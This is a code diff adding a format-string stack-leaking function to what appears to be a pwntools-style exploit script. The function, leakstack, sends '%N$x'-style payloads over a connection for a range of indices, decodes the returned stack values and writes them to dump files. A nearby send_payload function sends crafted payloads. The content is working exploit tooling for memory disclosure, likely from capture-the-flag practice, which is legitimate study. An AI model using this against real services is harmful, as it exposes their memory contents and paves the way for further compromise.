@@ -105,7 +105,25 @@ def send_payload(s,dest,data,offset):
    print "[+] payload = "+repr(payload)
    s.sendline(payload)
 
-
+def leakstack(r,start,end,writes):
+   dump=open('dump','wb')
+   dump1=open('dump1','w')
+   for i in range(start,end):
+     try :
+       payload="%"+str(i)+"$"+writes
+       r.sendline(payload)
+       msg=r.recvline()
+       #context.bits=len(msg)*8
+       if writes == "x" or writes == "%lx" :
+           msg = msg.strip().decode('hex')
+           msg = msg[::-1]
+       print "[+] trying with index"+str(i)+" "+msg
+       dump.write(msg)
+       dump1.write(str(i)+" "+msg)
+       dump1.write('\n')
+     except EOFError :
+       print "[+] no luck here !!"
+       i=i+1
 
 
 
